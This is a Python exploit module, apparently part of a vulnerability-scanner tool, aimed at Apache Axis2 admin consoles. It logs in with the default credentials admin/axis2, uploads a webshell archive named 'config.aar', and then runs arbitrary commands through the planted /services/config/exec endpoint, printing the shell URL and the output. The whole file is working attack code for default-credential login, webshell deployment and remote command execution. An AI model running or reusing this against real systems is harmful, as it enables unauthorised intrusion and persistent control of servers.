# -*- coding:utf-8 -*-
# axis2弱密码
import re

import requests

from .. import requestUtil, fileUtil
from VulnScanModel.models import VulnScan


def upload_aar(url, session):
    resp = requestUtil.get(url + "upload", session=session)
    token = re.findall('doUpload\?token=(.*?)"', resp.text)
    if not token == []:
        upload_path = "doUpload?token=%s" % token[0]
    else:
        upload_path = "upload"
    data = requestUtil.get_file_data("config.aar",
                                     fileUtil.open_file(dir="webshell", filename="config.aar", mode="rb").read())
    resp = requestUtil.post(url + upload_path, data=data[0], header={"Content-Type": data[1]}, session=session)
    print(resp.text)
    return True


def login(url, session):
    resp = requestUtil.post(url + "login", data="userName=admin&password=axis2&submit=+Login+", session=session)
    return True


def rce(url, cmd):
    resp = requestUtil.get(f"{url}/services/config/exec?cmd={cmd}", timeout=10)
    if resp.status_code != 404:
        return re.findall("<ns:return>(.*?)</ns:return>", resp.text, re.DOTALL)[0].replace("&#xd;", "\n")
    else:
        return False


def exp(vuln: VulnScan, cmd, content=""):
    root_url = vuln.url + vuln.specify.replace("/axis2-admin/", "")
    result = rce(root_url, cmd)
    if not result:
        session = requests.session()
        admin_url = vuln.url + vuln.specify
        login(admin_url, session)
        upload_aar(admin_url, session)
        result = rce(vuln.url + vuln.specify.replace("/axis2-admin/", ""), cmd)
    return "shell地址: \n%s" % f"{root_url}/services/config\n输出结果:\n" + str(result)
